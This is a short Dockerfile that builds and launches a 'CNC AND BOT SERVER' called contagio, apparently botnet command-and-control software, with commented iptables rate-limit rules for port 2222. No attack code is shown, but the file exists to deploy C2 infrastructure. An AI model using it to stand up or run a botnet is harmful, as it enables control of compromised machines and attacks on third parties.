# CNC AND BOT SERVER

FROM alpine:latest

RUN apk add --no-cache git make musl-dev go
ENV GOROOT /usr/lib/go
ENV GOPATH /go
ENV PATH /go/bin:$PATH
RUN mkdir -p ${GOPATH}/src ${GOPATH}/bin
RUN ulimit -n 99999

RUN mkdir /contagio/
WORKDIR /contagio/

COPY contagio /contagio/contagio
COPY sqlite /contagio/sqlite
COPY config.toml /contagio/
COPY main.go /contagio/
COPY themes /contagio/themes

RUN go mod init contagio
RUN go mod tidy
RUN go build -o cncbot .
CMD ["./cncbot", "docker_cnc"]

# iptables -A INPUT -p tcp --dport 2222 -m connlimit --connlimit-above 1 --connlimit-mask 32 -j REJECT --reject-with tcp-reset
# iptables -A INPUT -p tcp --dport 2222 -m recent --set --name ratelimit
# iptables -A INPUT -p tcp --dport 2222 -m recent --update --seconds 1 --hitcount 10 --rttl --name ratelimit -j DROP
